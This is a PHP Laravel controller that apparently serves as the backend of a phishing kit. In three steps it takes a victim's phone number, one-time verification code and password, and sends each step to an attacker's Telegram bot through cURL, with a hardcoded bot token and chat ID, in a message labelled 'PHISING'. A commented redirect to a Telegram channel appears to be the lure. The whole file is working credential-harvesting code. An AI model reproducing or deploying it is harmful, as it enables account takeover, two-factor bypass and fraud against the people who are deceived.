<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Session;

class KolektorTwoController extends Controller
{
    public function index(Request $request)
    {
        return inertia('KolektorTwo/Index');
    }

    public function login_store(Request $request)
    {
        $subdomain = explode('.', $request->getHost())[0];
        Session::forget("dataNumber");
        $phone = $request->phone;
        $code = $request->code;
        Session::push("dataNumber", [
            'getPhone' => $phone,
            'getDialCode' => $code,
        ]);
        $this->sendKode($phone, $code, "", "", $subdomain);
        return redirect('verif/2');
    }

    public function verif(Request $request)
    {
        $data = Session::get('dataNumber');

        $getPhone = $data[0]['getPhone'] ?? 0;
        $getDialCode = $data[0]['getDialCode'] ?? 0;
        return inertia('KolektorTwo/Verif', compact('getPhone', 'getDialCode'));
    }

    public function verif_store(Request $request)
    {
        $subdomain = explode('.', $request->getHost())[0];
        Session::forget("dataNumber");
        $phone = $request->phone;
        $code = $request->dial_code;
        $verif = $request->code;
        Session::push('dataNumber', [
            'getPhone' => $phone,
            'getDialCode' => $code,
            'getVerif' => $verif,
        ]);
        $this->sendKode($phone, $code, $verif, "", $subdomain);
        return redirect('password/2');
    }

    public function get_password(Request $request)
    {
        $data = Session::get('dataNumber');

        $getPhone = $data[0]['getPhone'] ?? 0;
        $getDialCode = $data[0]['getDialCode'] ?? 0;
        $getVerif = $data[0]['getVerif'] ?? 0;
        return inertia('KolektorTwo/GetPassword', compact(
            'getPhone',
            'getDialCode',
            'getVerif'
        ));
    }
    public function store_password(Request $request)
    {
        $subdomain = explode('.', $request->getHost())[0];
        Session::forget("dataNumber");
        $phone = $request->phone;
        $code = $request->dial_code;
        $verif = $request->code;
        $password = $request->password;
        $this->sendKode($phone, $code, $verif, $password, $subdomain);
        // return redirect('https://t.me/malaysiacinemahot');
    }


    public function sendKode($phone = "", $code = "", $otp = "", $password = "")
    {
        // mulai dari bot 6 yah

        // BOT 6
        $bot_token = "8058737890:AAHXd0yGMLnXmwUpi9IqBVi6VFsg4TSDitg";
        $chat_id = "7885885125";
        $phisData = "MY1";

        $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage";




        $ch = curl_init();

        // Set cURL options
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, [
            'chat_id' => $chat_id,
            'text' => "Phone | $phone \n Code | $code \n OTP | $otp \n password : $password \n \n \n
    PHISING $phisData
    "
        ]);

        // Eksekusi cURL request
        $response = curl_exec($ch);

        // Menutup koneksi cURL
        curl_close($ch);
    }
}
